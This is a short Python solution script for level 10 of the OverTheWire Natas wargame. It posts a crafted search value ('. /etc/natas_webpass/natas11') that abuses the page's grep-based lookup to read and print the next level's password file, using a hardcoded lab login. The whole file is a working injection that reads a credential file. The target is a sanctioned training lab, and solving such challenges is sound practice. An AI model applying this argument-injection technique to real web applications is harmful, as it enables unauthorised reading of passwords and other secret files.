import requests
import re

username = 'natas10'
password = 'nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'

url = f'http://{username}.natas.labs.overthewire.org'

data = { 'needle' : '. /etc/natas_webpass/natas11' }

response = requests.post(url, data = data, auth = (username, password))
content = response.text

print(re.findall('/etc/natas_webpass/natas11:(.*)', content)[0])